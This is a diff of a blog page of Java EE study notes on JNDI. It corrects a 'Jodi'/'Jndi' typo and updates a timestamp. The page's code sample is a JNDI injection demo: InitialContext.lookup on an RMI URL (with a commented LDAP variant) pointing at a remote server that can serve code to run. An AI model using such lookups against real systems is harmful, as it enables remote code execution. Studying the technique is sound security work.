@@ -16,16 +16,16 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Jodi简介 使用12345678public class JndiInjectServlet &amp;#123;    public static void main(String[] args) throws NamingException &amp;#123;        InitialContext initialContext&#x3D;new InitialContext();&#x2F;&#x2F;        initi">
+    <meta name="description" content="Jndi简介 使用12345678public class JndiInjectServlet &amp;#123;    public static void main(String[] args) throws NamingException &amp;#123;        InitialContext initialContext&#x3D;new InitialContext();&#x2F;&#x2F;        initi">
 <meta property="og:type" content="article">
 <meta property="og:title" content="jndi">
 <meta property="og:url" content="https://tsy244.github.io/2025/05/12/javaee/jndi/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="Jodi简介 使用12345678public class JndiInjectServlet &amp;#123;    public static void main(String[] args) throws NamingException &amp;#123;        InitialContext initialContext&#x3D;new InitialContext();&#x2F;&#x2F;        initi">
+<meta property="og:description" content="Jndi简介 使用12345678public class JndiInjectServlet &amp;#123;    public static void main(String[] args) throws NamingException &amp;#123;        InitialContext initialContext&#x3D;new InitialContext();&#x2F;&#x2F;        initi">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/javaee/20230308194119-24a1affa-bda6-1.png">
 <meta property="article:published_time" content="2025-05-11T23:47:00.000Z">
-<meta property="article:modified_time" content="2025-06-01T09:42:24.314Z">
+<meta property="article:modified_time" content="2025-06-08T07:45:31.440Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="javaee">
 <meta name="twitter:card" content="summary_large_image">
@@ -283,7 +283,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Jodi"><a href="#Jodi" class="headerlink" title="Jodi"></a>Jodi</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/javaee/20230308194119-24a1affa-bda6-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+                <h1 id="Jndi"><a href="#Jndi" class="headerlink" title="Jndi"></a>Jndi</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/javaee/20230308194119-24a1affa-bda6-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiInjectServlet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        InitialContext initialContext=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><span class="hljs-comment">//        initialContext.lookup(&quot;ldap://198.19.249.35:1389/c2cks7&quot;);</span><br>        initialContext.lookup(<span class="hljs-string">&quot;rmi://198.19.249.35:1099/c2cks7&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
 
 
